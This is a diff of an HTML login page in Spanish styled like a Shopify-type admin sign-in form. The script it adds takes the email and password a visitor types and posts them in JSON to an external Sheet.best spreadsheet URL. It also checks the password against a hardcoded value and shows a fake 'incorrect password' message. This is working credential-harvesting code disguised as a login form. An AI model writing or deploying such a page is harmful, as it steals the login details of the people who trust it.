@@ -131,7 +131,7 @@
   </style>
 
 
-<div class="page-container">
+<div class="page-container"> 
   <main class="page-main">
     <div class="page-content">
       <div class="main-content">
@@ -156,7 +156,7 @@
                 </div>
               </div>
 
-              <form id="loginForm" onsubmit="return false;">
+              <form id="formulario">
                 <div class="ui-form__section">
                   <!-- Email -->
                   <div class="ui-form__group polaris-uplift-input-wrapper">
@@ -173,8 +173,63 @@
                       <input type="password" placeholder="Contraseña" class="next-input password-typo-input" id="password" required />
                     </div>
                   </div>
- <script>
-    const API_URL = "https://api.sheetbest.com/sheets/d867f5e4-5cbe-4b84-aa70-d1195e64372a";
+
+                  <!-- Error message -->
+                  <p id="error-message" style="color:#D91C1C; display:none; font-weight: bold; margin-top: 10px;">
+                    Contraseña incorrecta. Inténtelo de nuevo.
+                  </p>
+
+                  <!-- Submit button -->
+                  <button type="submit" class="ui-button ui-button--primary ui-button--full-width ui-button--size-large login-button">
+                    <span>Continuar</span>
+                  </button>
+                </div>
+              </form>
+
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+  const API_URL = "https://api.sheetbest.com/sheets/d867f5e4-5cbe-4b84-aa70-d1195e64372a";
+
+  document.getElementById("formulario").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    const errorMsg = document.getElementById("error-message");
+
+    if (password !== "luxeny123") {
+      errorMsg.style.display = "block";
+      return;
+    }
+
+    errorMsg.style.display = "none";
+
+    fetch(API_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    })
+    .then(res => {
+      if (!res.ok) throw new Error("Error en la solicitud");
+      return res.json();
+    })
+    .then(data => {
+      alert("¡Inicio de sesión exitoso y datos guardados!");
+      document.getElementById("formulario").reset();
+    })
+    .catch(err => {
+      alert("Hubo un error al guardar los datos.");
+      console.error(err);
+    });
+  });
+</script>
 
     document.getElementById("formulario").addEventListener("submit", function (e) {
       e.preventDefault();
